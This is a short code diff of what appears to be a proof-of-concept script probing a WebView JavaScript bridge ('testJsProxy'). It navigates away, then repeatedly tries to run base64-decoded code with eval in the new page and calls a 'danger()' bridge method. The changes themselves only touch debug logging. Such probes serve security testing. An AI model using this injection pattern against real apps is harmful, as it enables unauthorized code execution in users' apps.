@@ -4,6 +4,7 @@
   const currUrl = location.href;
     console.log(currUrl)
   const payload = `
+  console.log(location.href)
   if(!location.href.startsWith("${currUrl}")&&!window.__cloudx_called){
   window.__cloudx_called = true;
   console.log(window.testJsProxy.danger())
@@ -12,7 +13,6 @@
   for(let i=0; i<1000; i++){
   setTimeout(function(){
   if(window.testJsProxy && typeof window.testJsProxy.test === "function"){
-    console.log(111111)
   eval(atob(base64));
   }},i)}
   location.href = url;
